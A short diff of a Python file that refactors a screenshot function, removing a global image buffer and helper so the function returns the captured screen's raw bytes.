@@ -61,26 +61,14 @@ def open_process(name):
     except:
         return '0'
 
-photo_to_send = None
-
 def take_screen_shot():
-    global photo_to_send
-
     image = ImageGrab.grab(bbox=None)
 
     image = image.resize(3200, 1800)
 
     photo_to_send = image.tobytes()
 
-    size = len(photo_to_send)
-
-    return size
-
-def get_image():
-    global photo_to_send
-
     return photo_to_send
-
 
 def get_value(link, name):
     try:
